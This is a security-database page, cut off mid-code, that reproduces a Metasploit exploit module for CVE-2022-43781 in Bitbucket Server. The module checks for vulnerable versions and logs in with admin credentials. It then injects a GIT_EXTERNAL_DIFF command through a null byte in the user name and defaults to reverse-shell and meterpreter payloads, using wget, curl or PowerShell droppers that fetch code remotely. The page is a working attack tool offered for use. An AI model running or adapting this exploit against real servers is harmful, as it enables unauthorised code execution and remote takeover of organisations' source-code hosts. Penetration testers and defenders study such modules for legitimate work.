---
title: Bitbucket Environment Variable Remote Command Injection
url: https://cxsecurity.com/issue/WLB-2023030042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-20
fetch_date: 2025-10-04T10:04:37.359641
---

# Bitbucket Environment Variable Remote Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Bitbucket Environment Variable Remote Command Injection** **2023.03.19**  Credit:  **[Shelby Pace](https://cxsecurity.com/author/Shelby%2BPace/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Git
include Msf::Exploit::Git::SmartHttp
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Bitbucket Environment Variable RCE',
'Description' => %q{
For various versions of Bitbucket, there is an authenticated command injection
vulnerability that can be exploited by injecting environment
variables into a user name. This module achieves remote code execution
as the `atlbitbucket` user by injecting the `GIT\_EXTERNAL\_DIFF` environment
variable, a null character as a delimiter, and arbitrary code into a user's
user name. The value (payload) of the `GIT\_EXTERNAL\_DIFF` environment variable
will be run once the Bitbucket application is coerced into generating a diff.
This module requires at least admin credentials, as admins and above
only have the option to change their user name.
},
'License' => MSF\_LICENSE,
'Author' => [
'Ry0taK', # Vulnerability Discovery
'y4er', # PoC and blog post
'Shelby Pace' # Metasploit Module
],
'References' => [
[ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],
[ 'URL', 'https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-security-advisory-2022-11-16-1180141667.html'],
[ 'CVE', '2022-43781']
],
'Platform' => [ 'win', 'unix', 'linux' ],
'Privileged' => true,
'Arch' => [ ARCH\_CMD, ARCH\_X86, ARCH\_X64 ],
'Targets' => [
[
'Linux Command',
{
'Platform' => 'unix',
'Type' => :unix\_cmd,
'Arch' => [ ARCH\_CMD ],
'Payload' => { 'Space' => 254 },
'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse\_bash' }
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'MaxLineChars' => 254,
'Type' => :linux\_dropper,
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'CmdStagerFlavor' => %i[wget curl],
'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse\_tcp' }
}
],
[
'Windows Dropper',
{
'Platform' => 'win',
'MaxLineChars' => 254,
'Type' => :win\_dropper,
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'CmdStagerFlavor' => [ :psh\_invokewebrequest ],
'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse\_tcp' }
}
]
],
'DisclosureDate' => '2022-11-16',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'Reliability' => [ REPEATABLE\_SESSION ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ]
}
)
)
register\_options(
[
Opt::RPORT(7990),
OptString.new('USERNAME', [ true, 'User name to log in with' ]),
OptString.new('PASSWORD', [ true, 'Password to log in with' ]),
OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/'])
]
)
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'login'),
'keep\_cookies' => true
)
return CheckCode::Unknown('Failed to retrieve a response from the target') unless res
return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')
nokogiri\_data = res.get\_html\_document
footer = nokogiri\_data&.at('footer')
return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer
version\_info = footer.at('span')&.children&.text
return CheckCode::Detected('Failed to find version information in footer section') unless version\_info
vers\_matches = version\_info.match(/v(\d+\.\d+\.\d+)/)
return CheckCode::Detected('Failed to find version info in expected format') unless vers\_matches && vers\_matches.length > 1
version\_str = vers\_matches[1]
vprint\_status("Found version #{version\_str} of Bitbucket")
major, minor, revision = version\_str.split('.')
rev\_num = revision.to\_i
case major
when '7'
case minor
when '0', '1', '2', '3', '4', '5'
return CheckCode::Appears
when '6'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 18
when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'
return CheckCode::Appears
when '17'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 11
when '18', '19', '20'
return CheckCode::Appears
when '21'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 5
end
when '8'
print\_status('Versions 8.\* are vulnerable only if the mesh setting is disabled')
case minor
when '0'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 4
when '1'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 4
when '2'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 3
when '3'
return CheckCode::Appears if rev\_num >= 0 && rev\_num <= 2
when '4'
return CheckCode::Appears if rev\_num == 0 || rev\_num == 1
end
end
CheckCode::Detected
end
def default\_branch
@default\_branch ||= Rex::Text.rand\_text\_alpha(5..9)
end
def uname\_payload(cmd)
"#{datastore['USERNAME']}\u0000GIT\_EXTERNAL\_DIFF=$(#{cmd})"
end
def log\_in(username, password)
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'login'),
'keep\_cookies' => true
)
fail\_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'j\_atl\_security\_check'),
'keep\_cookies' => true,
'vars\_post' => {
'j\_username' => username,
'j\_password' => password,
'\_atl\_remember\_me' => 'on',
'submit' => 'Log in'
}
)
fail\_with(Failure::UnexpectedReply, 'Didn\'t retrieve a response') unless res
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'projects'),
'keep\_cookies' => true
)
fail\_with(Failure::UnexpectedReply, 'No response from the projects page') unless res
unless res.body.include?('Logged in')
fail\_with(Failure::Unex...